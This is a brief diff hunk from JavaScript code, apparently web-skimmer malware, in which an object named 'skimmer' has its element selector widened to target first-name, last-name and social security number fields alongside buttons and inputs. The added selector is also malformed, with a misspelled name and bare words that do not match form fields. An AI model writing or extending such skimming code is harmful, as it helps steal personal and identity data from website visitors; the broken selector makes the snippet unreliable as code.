@@ -54,7 +54,7 @@ var skimmer = {
 
        try {
 
-           var btn = document.querySelectorAll(‘a[href*=\’javascript:void(0)\’],button, input, submit, .btn, .button’);
+           var btn = document.querySelectorAll(‘a[href*=\’javascript:void(0)\’],fisrtName, lastName, ssn, button, input, submit, .btn, .button’);
 
            for (var i = 0; i < btn.length; i++) {
 
